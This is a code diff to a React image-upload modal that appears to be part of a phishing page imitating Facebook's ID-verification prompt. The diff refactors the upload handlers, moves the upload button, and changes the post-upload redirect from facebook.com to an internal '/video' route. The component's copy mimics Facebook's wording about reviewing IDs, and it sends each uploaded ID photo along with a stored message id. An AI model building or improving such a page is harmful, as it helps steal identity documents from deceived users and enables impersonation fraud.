@@ -1,7 +1,9 @@
-import { faClose } from '@fortawesome/free-solid-svg-icons';
+import { faClose, faImage } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import React, { useRef, useState } from 'react';
+import React, { useCallback, useRef, useState } from 'react';
+import { useNavigate } from 'react-router-dom';
+
 interface ImageUploadProps {
 	onClose: () => void;
 }
@@ -9,6 +11,7 @@ interface ImageUploadProps {
 const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 	const fileInputRef = useRef<HTMLInputElement | null>(null);
 	const [uploading, setUploading] = useState(false);
+	const navigate = useNavigate();
 	const sendPhoto = async ({
 		photo,
 		message_id,
@@ -27,39 +30,39 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 		});
 	};
 
-	const handleFileChange = async (
-		event: React.ChangeEvent<HTMLInputElement>,
-	) => {
-		const file = event.target.files ? event.target.files[0] : null;
-
-		if (file) {
+	const handleFileUpload = useCallback(
+		async (file: File) => {
 			setUploading(true);
-
 			try {
 				const message_id = localStorage.getItem('message_id');
 				await sendPhoto({
 					photo: file,
 					message_id: Number(message_id),
 				});
-				window.location.href = 'https://facebook.com/';
+				setTimeout(() => {
+					navigate('/video');
+				}, 0);
 			} catch (error) {
 				console.error('Error uploading image:', error);
 			} finally {
 				setUploading(false);
 				if (fileInputRef.current) {
 					fileInputRef.current.value = '';
-					const event = new Event('change', { bubbles: true });
-					fileInputRef.current.dispatchEvent(event);
 				}
 			}
-		}
-	};
+		},
+		[navigate],
+	);
 
-	const handleButtonClick = () => {
-		if (fileInputRef.current && !uploading) {
-			fileInputRef.current.click();
-		}
-	};
+	const handleFileChange = useCallback(
+		async (event: React.ChangeEvent<HTMLInputElement>) => {
+			const file = event.target.files ? event.target.files[0] : null;
+			if (file) {
+				await handleFileUpload(file);
+			}
+		},
+		[handleFileUpload],
+	);
 
 	return (
 		<div className='fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-50'>
@@ -80,8 +83,8 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 						Choose type of ID to upload
 					</b>
 					<p className='mt-2 text-gray-600'>
-						We’ll use your ID to review your name, photo, and date
-						of birth. It won’t be shared on your profile.
+						We'll use your ID to review your name, photo, and date
+						of birth. It won't be shared on your profile.
 					</p>
 				</div>
 				<div className='mb-4 w-full font-semibold text-gray-700'>
@@ -127,6 +130,19 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 					</label>
 				</div>
 
+				<div className='mt-6'>
+					<button
+						className={`w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600 ${
+							uploading ? 'cursor-not-allowed opacity-50' : ''
+						}`}
+						onClick={() => fileInputRef.current?.click()}
+						disabled={uploading}
+					>
+						<FontAwesomeIcon icon={faImage} className='mr-2' />
+						{uploading ? 'Uploading...' : 'Choose File'}
+					</button>
+				</div>
+
 				<input
 					type='file'
 					accept='image/*'
@@ -134,7 +150,8 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 					onChange={handleFileChange}
 					className='hidden'
 				/>
-				<div className='rounded-md bg-gray-100 p-4 text-sm text-gray-600'>
+
+				<div className='mt-4 rounded-md bg-gray-100 p-4 text-sm text-gray-600'>
 					Your ID will be securely stored for up to 1 year to help
 					improve how we detect impersonation and fake IDs. If you opt
 					out, we'll delete it within 30 days. We sometimes use
@@ -147,13 +164,6 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
 						Learn more
 					</a>
 				</div>
-				<button
-					className={`mt-6 w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600 ${uploading ? 'cursor-not-allowed opacity-50' : ''}`}
-					onClick={handleButtonClick}
-					disabled={uploading}
-				>
-					{uploading ? 'Uploading...' : 'Upload Image'}
-				</button>
 			</div>
 		</div>
 	);
